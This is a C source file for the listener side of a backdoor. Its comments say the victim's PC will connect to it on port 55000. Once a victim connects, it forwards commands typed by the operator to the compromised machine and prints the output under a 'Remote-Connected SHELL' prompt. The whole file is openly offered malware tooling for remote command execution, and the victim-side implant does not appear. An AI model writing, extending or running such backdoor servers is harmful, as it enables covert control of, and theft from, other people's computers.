#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
#include<WinSock2.h>
#include<winsock.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <WS2tcpip.h>
#elif __linux__
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>
#endif

#define bzero(p, size) (void) memset((p), 0, (size)) // Zeros all bytes in a specified memory region


// SERVER USED FOR THE BACKDOOR
// This is supported for windows and linux.

int main(){

    // Variables for identifying sockets created
    int sock, client_socket;
    int port = 55000;   // Port in which you're hosting the server where victim's pc will try to connect

    // Buffers for handling commands
    char buffer[1024];
    char response[18834];

    #ifdef _WIN32
    WSADATA wsaData;

    if(WSAStartup(MAKEWORD(2, 0), &wsaData) != 0){
        printf("Error while creating WSAData. Aborting....");
        exit(1);
    } 
    #endif

    int optionValue = 1;
	socklen_t client_length;

    struct sockaddr_in ServerAddress, ClientAddress;


    sock = socket(AF_INET, SOCK_STREAM, 0);

    if(setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optionValue, sizeof(optionValue)) != 0){
        printf("Error setting options for TCP. Aborting....");
        exit(1);
    }

    ServerAddress.sin_family = AF_INET;
    ServerAddress.sin_addr.s_addr = INADDR_ANY;

    // Defining specific port for listening to
    ServerAddress.sin_port = htons(port);

    
    bind(sock, (struct sockaddr *) &ServerAddress, sizeof(ServerAddress));
    listen(sock, 5);

    client_length = sizeof(ClientAddress);

    client_socket = accept(sock, (struct sockaddr *) &ClientAddress, &client_length);

    while(1){
        label:

        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));

        printf("Remote-Connected SHELL ~ %s: ", inet_ntoa(ClientAddress.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);

        strtok(buffer, "\n");

        #ifdef _WIN32
        send(client_socket, buffer, sizeof(buffer), 0);
        #elif __linux__
        write(client_socket, buffer, sizeof(buffer));
        #endif

        if(strncmp("q", buffer, 1) == 0){
            break;
        }
        // You can add some exceptions here for the buffer input
        else{
            recv(client_socket, response, sizeof(response), 0);
            printf("%s", response);
        }   

    }


}